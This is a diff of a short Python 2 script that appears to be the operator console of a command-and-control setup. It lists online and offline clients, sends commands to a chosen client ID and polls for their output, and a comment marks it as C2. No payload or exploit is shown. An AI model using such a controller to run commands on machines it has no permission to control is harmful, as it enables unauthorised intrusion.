@@ -1,7 +1,8 @@
 #! /usr/bin/python
 
-import requests
 import json
+import requests
+import time
 
 BASE_URL = "http://localhost:8080"
 
@@ -55,47 +56,39 @@ def main():
         else:
             cmdOutput = sendCMD(currentID, cmd)
             if cmdOutput:
-                print "Command sent successfully. Waiting for output..."
+                print "Command sent successfully. Waiting for output."
+                out = getOutput(currentID)
+                while out == "":
+                    time.sleep(5)
+                    out = getOutput(currentID)
+                print out
 
             else:
                 print "Invalid ID"
-            # else if cmd == "get ids":
-            #     print "get ids"
-            # else if cmd == "get ids":
-            #     print "get ids"
-            # else if cmd == "get ids":
-            #     print "get ids"
-            # else if cmd == "get ids":
-            #     print "get ids"
-            # else if cmd == "get ids":
-            #     print "get ids"
 
 
 def sendCMD(id, cmd):
-    # d = json.loads({"id": id, "cmd": cmd})
-
     resp = requests.post(BASE_URL + "/cmd", data={"id": id, "cmd": cmd})
     r = json.loads(resp.text)
 
-    return r['status'] == 'fail'
+    return r['status'] != 'fail'
 
 
 def getIDS():
     resp = requests.get(BASE_URL + "/clients")
     r = json.loads(resp.text)
 
+    # INTEL(I_C2_THERE!)
+
     return [r['online'], r['offline']]
 
 
 def getOutput(id):
-
-    d = {'id': id}
-
-    resp = requests.get(BASE_URL + "/output", data=d)
+    resp = requests.get(BASE_URL + "/output", data={'id': id})
     r = json.loads(resp.text)
 
     if r['status'] == 'fail':
-        return "ID not found"
+        return False
     else:
         return r['output']
 
